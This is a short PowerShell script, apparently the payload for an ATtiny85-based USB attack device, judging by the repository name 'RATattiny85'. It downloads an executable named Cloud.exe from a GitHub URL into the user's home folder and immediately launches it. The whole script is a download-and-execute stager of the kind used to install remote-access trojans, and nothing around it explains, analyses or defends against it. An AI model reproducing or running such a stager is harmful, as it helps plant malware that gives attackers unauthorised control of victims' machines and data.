$url = "https://github.com/joyfulharbor/RATattiny85/raw/main/Cloud.exe"
$outpath = "$home/Cloud.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath

$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$home/Cloud.exe" -ArgumentList $args
